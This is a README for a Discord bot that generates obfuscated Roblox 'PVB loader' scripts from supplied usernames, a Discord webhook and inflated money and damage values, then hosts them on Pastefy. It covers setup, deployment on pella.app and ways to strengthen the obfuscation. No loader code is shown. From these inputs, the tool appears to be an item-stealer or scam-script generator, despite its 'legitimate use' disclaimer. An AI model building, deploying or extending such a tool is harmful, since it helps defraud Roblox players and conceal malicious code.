# Nori Script Discord Bot

Nori Script#4550 is a Discord bot built for Roblox developers. It generates obfuscated PVB loader scripts via the `/gen pvb` slash command, uploads the loader to Pastefy, and delivers the link safely to the command author.

## Features

- `/gen pvb` slash command with Roblox usernames, webhook URL, and optional MPS/DPS overrides.
- Lightweight Prometheus-inspired obfuscator (variable renaming, string splitting, hex numbers, junk code).
- Pastefy integration for delivering raw loader links.
- Detailed console logging for every step.
- Graceful error handling for invalid input, DM failures, and network errors.

## Project Structure

```
textdiscord-bot/
├── .env                    # Environment variables (never commit secrets)
├── README.md               # This guide
├── package.json            # Dependencies and Node.js version
├── commands/
│   └── genPvb.js           # /gen pvb implementation
├── config/
│   └── botConfig.json      # Discord intents and optional presence
├── core/
│   ├── main.js             # Bot bootstrapper
│   └── utils/
│       └── prometheus.js   # Obfuscation helper
└── handlers/
    ├── interaction.js      # Slash command dispatcher
    └── ready.js            # Ready event + slash-command registration
```

## Prerequisites

- Node.js 16 or newer (pella.app already meets this requirement).
- A Discord application with a bot user and the **application.commands** scope granted in your server.
- A Pastefy account is optional; public uploads work without authentication.

## Discord Bot Setup

1. Open the [Discord Developer Portal](https://discord.com/developers/applications) and create a new application named **Nori Script** (or reuse your existing one).
2. Under **Bot**, add a bot user, copy the bot token, and enable the privileged intents you may need (only `Guilds` is required here).
3. Under **OAuth2 → URL Generator**, select the **bot** and **applications.commands** scopes. Grant the bot the **Send Messages** permission so it can reply in channels.
4. Invite the bot to your server using the generated URL.
5. Record the **Application (Client) ID**, **Bot Token**, and (optionally) the target **Guild ID** for instant guild-specific command registration.

## Environment Variables

Copy `.env` to `.env.local` (or edit the file directly before deploying) and populate it with your credentials:

```
TOKEN=your-bot-token-here
CLIENT_ID=your-client-id-here
GUILD_ID=your-test-guild-id   # optional, speeds up slash-command sync
DEPLOY=false                  # set to true only when you want to register commands
```

> **Tip:** Keep `DEPLOY=true` only for the first boot (or whenever you add/remove commands). Reset it to `false` afterwards to avoid unnecessary registrations on every restart.

## Local Testing

1. Install dependencies:

   ```bash
   npm install
   ```

2. Run the bot locally:

   ```bash
   npm start
   ```

3. Watch the console logs. On first boot (with `DEPLOY=true`) you should see messages similar to:

   ```
   [Config] Loaded bot configuration
   [Commands] Loaded command: gen
   [Handlers] Registered handler: ready.js
   [Handlers] Registered handler: interaction.js
   [Startup] Logging in...
   [Ready] Logged in as Nori Script#4550
   [Ready] Registering global commands
   [Ready] Global commands registered
   [Ready] Registering guild commands for 123456789012345678
   [Ready] Guild commands registered
   ```

4. In Discord, run `/gen pvb` (if you set `GUILD_ID`, the command appears immediately; otherwise allow 1–15 minutes for global sync).

## Using `/gen pvb`

- **usernames**: Comma-separated Roblox usernames (e.g., `DevOne,DevTwo`).
- **webhook**: A Discord webhook URL starting with `https://discord.com/api/webhooks/`.
- **mps** (optional): Money per second value. Defaults to `500000`.
- **dps** (optional): Damage per second value. Defaults to `500000`.

**Example Response Flow**

1. Bot defers the command immediately to avoid timeouts.
2. Generates the loader, obfuscates it, and uploads it to Pastefy.
3. Sends the raw Pastefy link via DM: `https://pastefy.app/abc123/raw`.
4. Replies in-channel with `PVB loader generated! Link sent to DMs. MPS: 500,000, DPS: 500,000` (or includes the link if DMs failed).

## Deploying on pella.app

1. Create a new Node.js project on [pella.app](https://pella.app/) and upload the contents of the `textdiscord-bot` directory.
2. In the project settings, add the following environment variables:
   - `TOKEN`: Your Discord bot token.
   - `CLIENT_ID`: The application ID.
   - `GUILD_ID`: (Optional) Guild for quick command sync.
   - `DEPLOY`: `true` for the first deployment; switch to `false` afterwards.
3. Ensure the **Start Command** is set to `npm start`.
4. Deploy the project. pella.app automatically runs `npm install` using `package.json` and starts the bot.
5. Monitor the **Logs** tab. You should see the same log sequence as in local testing. Once commands register successfully, set `DEPLOY=false` and redeploy to avoid repeated re-registration.

## Testing on Discord

- Use `/gen pvb usernames:DevOne,DevTwo webhook:https://discord.com/api/webhooks/... mps:750000 dps:820000`.
- Expect a DM with the Pastefy link. If your privacy settings block DMs, the bot posts the link directly in the channel reply.
- Check the webhook you supplied; it will receive loader notifications from your downstream systems.

## Troubleshooting

| Issue | Possible Cause | Fix |
|-------|----------------|-----|
| Slash command doesn’t appear | Global commands can take up to 15 minutes. `DEPLOY` might be `false` during the first boot. | Set `DEPLOY=true`, redeploy, and optionally set `GUILD_ID` for instant sync. Wait if registering globally. |
| `Application did not respond` error | Command took longer than 3 seconds before acknowledging. | Ensure the bot logs show `Interaction deferred`. If not, verify it reaches the command handler and that no uncaught error occurs before `deferReply`. |
| Invalid webhook message | Webhook input does not start with `https://discord.com/api/webhooks/`. | Provide a valid Discord webhook URL. |
| No DM received | User has DMs disabled or bot lacks DM permission. | The bot automatically posts the Pastefy link in-channel when DMs fail. |
| No logs on pella.app | Missing environment variables or crash during startup. | Confirm `TOKEN` is set, review deployment logs, and ensure `npm start` is the configured start command. |
| Pastefy upload failure | Network hiccup or API issue. | Check logs for `[Pastefy]` errors, re-run the command, or verify Pastefy is reachable from pella.app. |

## Maintenance Tips

- Keep dependencies updated periodically (`discord.js` and `axios`).
- Rotate the bot token if you suspect it has been exposed.
- Watch pella.app logs for `[Command] Failed to generate loader` messages to diagnose runtime errors.
- Extend the obfuscator in `core/utils/prometheus.js` if you need heavier protection (e.g., control flow flattening, advanced renaming).

## License

This project is provided as-is for legitimate Roblox development use cases. Ensure you comply with Discord and Roblox terms of service when operating the bot.
